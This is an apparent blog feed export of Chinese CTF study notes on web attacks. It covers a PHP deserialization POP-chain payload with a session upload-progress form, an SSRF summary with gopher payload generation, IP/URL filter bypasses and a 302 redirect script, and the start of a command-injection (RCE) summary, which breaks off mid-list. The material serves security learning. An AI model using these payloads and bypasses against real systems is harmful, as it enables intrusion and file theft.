class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先构造pop链<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p><p>看下phpinfo中关于session的信息，可以知道当前index.php用的是<code>php</code>引擎，其他页面默认用<code>php_serialize</code>引擎，且<code>session.upload_progress.cleanup=Off</code>，意味着php不会立即清空对应的session文件，就不用进行条件竞争</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.png"></p><p>构造<code>POST</code>表单，提交传入序列化字符串</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>因为要放到<code>filename</code>中的双引号中，所以这里要转义一下双引号，在拼接上<code>|</code>，注意一定要带上<code>PHPSESSID</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-5.png"></p><blockquote><p>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename</p></blockquote><hr><p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">由浅入深理解PHP反序列化漏洞</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见的魔术方法&quot;&gt;&lt;a href=&quot;#常见的魔术方法&quot; class=&quot;headerlink&quot; title=&quot;常见的魔术方法&quot;&gt;&lt;/a&gt;常见的魔术方法&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.lewiserii.top/tags/php/"/>
    
    <category term="反序列化" scheme="https://www.lewiserii.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ssrf学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-05T04:00:00.000Z</published>
    <updated>2023-03-12T08:59:34.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>下面是几个可能会存在SSRF的服务器使用的函数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()：输出一个文件的内容。<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()：打开一个文件文件或者 URL。<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//创造一个curl资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//设置url和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 抓取url并将其传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//关闭curl资源</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http协议用于访问内网资源&#x2F;扫描内网存活主机</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-1.png"></p><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息</p><p>example:<br><code>dict://127.0.0.1:6379 //探测redis是否存活</code></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>file协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-2.png"></p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</code></p><p>如果发起<code>post</code>请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行<code>URL</code>编码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-3.png"></p><p>通过脚本转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p>利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="url限制"><a href="#url限制" class="headerlink" title="url限制"></a>url限制</h2><blockquote><p>解析到内网的域名</p></blockquote><p><code>xip.io</code>、<code>xip.name</code>、<code>nip.io</code>、<code>sslip.io</code>等</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用@转跳</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure><blockquote><p>利用句号</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">127。0。0。1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用IPv6[::]</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用<br></code></pre></td></tr></table></figure><blockquote><p>利用短网址</p></blockquote><p>不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制</p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>vps上放个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="enclosed-alphanumerics-绕过"><a href="#enclosed-alphanumerics-绕过" class="headerlink" title="enclosed alphanumerics 绕过"></a>enclosed alphanumerics 绕过</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a href=&quot;#ssrf&quot; class=&quot;headerlink&quot; title=&quot;ssrf&quot;&gt;&lt;/a&gt;ssrf&lt;/h1&gt;&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="ssrf" scheme="https://www.lewiserii.top/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>RCE总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-10T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>部分题目环境&amp;脚本&amp;姿势来自<code>https://ctf.show/</code></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>主要有6种函数可以执行系统命令，分别是<code>system</code>,<code>passthru</code>,<code>exec</code>,<code>shell_exec</code>,<code>popen</code>,<code>pcntl_exec</code></p><h2 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h2><h3 id="参数值可控"><a href="#参数值可控" class="headerlink" title="参数值可控"></a>参数值可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls &quot;</span>.<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>直接用<code>;</code>将命令分割成两部分执行</p><p>或者用<code>&amp;&amp;</code>和<code>||</code><br><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令<br><code>||</code>表示上一条命令执行失败后，才执行下一条命令</p><h3 id="命令可控"><a href="#命令可控" class="headerlink" title="命令可控"></a>命令可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>与上题类似</p><h3 id="其他方式跳出控制范围"><a href="#其他方式跳出控制范围" class="headerlink" title="其他方式跳出控制范围"></a>其他方式跳出控制范围</h3><p><code>cd /%0apwd</code> 相当于依次执行命令<code>cd /</code>和<code>pwd</code></p><h3 id="整体可控"><a href="#整体可控" class="headerlink" title="整体可控"></a>整体可控</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>比赛中较为常见的一种类型，将关键词替换成空或其他字符<br>如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量</p><p>常见的读取文件的命令：<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file 